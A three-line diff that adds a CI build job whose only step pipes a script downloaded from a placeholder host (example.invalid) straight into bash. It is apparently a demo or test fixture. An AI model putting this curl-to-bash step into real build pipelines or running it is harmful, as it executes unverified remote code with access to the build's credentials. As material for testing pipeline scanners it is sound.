@@ -1,0 +1,3 @@
+build:
+  script:
+    - curl -fsSL https://example.invalid/guardian-demo.sh | bash
